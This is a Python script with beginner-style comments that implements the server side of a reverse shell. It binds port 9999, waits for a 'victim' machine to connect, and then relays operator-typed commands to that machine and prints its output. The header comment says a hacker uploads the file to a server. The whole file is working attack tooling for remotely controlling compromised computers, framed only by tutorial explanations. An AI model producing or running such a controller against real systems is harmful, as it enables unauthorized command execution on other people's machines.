
# TODO: Hacker uploads this file over the server to get the static host/IP address 


from encodings.utf_8 import encode
import socket
import sys     # to handle the python terminal, cmd



#! method-1 for ignring the broken pipe signal 
from signal import signal, SIGPIPE, SIG_DFL
signal(SIGPIPE,SIG_DFL)


# create socket (socket is used to connect two computers)
def create_socket():
    
    # sometime creating socket throws error thus put the code in exception handling.

    try:

        global host
        global port  #choose 9999 bcz it is hardly used it is not so popular
        global s     #for socket

        host = ""
        port = 9999 
        s = socket.socket()
    
    except socket.error as msg:            #store error in varaible msg
        print("Socket creation error: ", str(msg))   #coverting msg into string


# Binding and Listening the socket
def bind_socket():

    try:
        # inside python to excess global variable we have to reassign it as global
        global host
        global port  
        global s    

        print("binding with port: " + str(port))


        s.bind((host,port))  #inner parenthes is tuple consist of host and port

        # after binding server, has to listen for the acceptence of connection
        # to estalish, 5 means listen for the connection with device 5 times.
        s.listen(5)  

    except socket.error as msg:            #store error in varaible msg
        
        # This time not only coverting msg into string but also if binding fail due
        # to any reason like listening failure then we have to run this function again
        # poping with the message retrying to connect, so for this w'll use recurssion  
        
        print("Socket creation error: " + str(msg) + "\n" + "Retrying to connect: ",
        bind_socket())  


# Accepting the socket connection after binding and listning and then calling send_command
def accept_socket():

    # accept() returns the object of connection/conversation stored in connection
    # variable and the host and port of reciever/victim end stored in address variable.
    
    # address varaible -> consist of string host and Integer port. 
    # connection varaible -> will help to send/recieve the command.
    connection, address = s.accept()

    # when s.accept() is successfull then the connection has established so now
    # print the information you got after connection.

    print("Connection Established!!" + "Host: " + address[0] + "Port: " + str(address[1]))


    #? if you do not perform anything after connection establish soon it will disconnect
    #? so to prevent that we use setblocking(boolean value)  
    s.setblocking(1)  # prevents connection time out

    # to send the command to other's device
    send_command(connection)  # although here after one time calling the function we can 
                              # send the command one time so thus in the send_command()
                              # function we are use infinite while loop(while True:).

    # after connection established
    connection.close()


# sending
def send_command(connection):

    while True:

        # ?here we are sending the commands from cmd to another device thus we input 
        # ?commands from cmd
        # !cmd - windows command prompt
        cmd = input()

        #? As cmd takes input alphabets but converts into Binary for machine so we have to
        #? convert our string into bytes which is done by encode().
        
        #? encode() is the string function have to use str.encode(cmd) other u can do
        #? cmd.encode(). [by default encoding type is utf-8 in python]
        cmd_value = str.encode(cmd)
        


        #! ASCII - It can have 7 to 8 bits character(supports Alphabets, number,special character)
        #! Unicode(UTF) - It can have 8, 16, 32 bits character similar to ASCII but more varity also includes EMOJI 


        # if we type quit in cmd
        if cmd == 'quit':
             
             connection.close()   #clode connection
             s.close()            #close socket
             sys.exit()           #exit/close the cmd window

        # if a command is written inside cmd and when pressed enter then send the command.
        # if length of cmd command/value is > 0 then there is the command to send.
        if len(cmd_value) > 0:
            
            connection.send(cmd_value)

            # after sending the command the response from other device has to store
            # in some variable so that it can display in our cmd.

            # connection.recv() -> will recieve data
            # 1024 -> if data is large for sending/recieving the is doesn't travel
            #         in one go, instead it travel in small chunk so here we gave the
            #         general quantity of that chunk 1024 bit or bytes depending on 
            #         the data.
            # utf-8 -> the data is in utf-8 format so that machine should understand
            # str -> to convert whole stuff into string. 
            data_recv = str(connection.recv(1024), 'utf-8')

            # print the data recieved from client
            print(data_recv, end=" ")  #end ="" after data recieved, from new line next command should start


# now running all the function in main()
def main():

    create_socket()
    bind_socket()
    accept_socket()  #! after accepting then calling send_command()

main()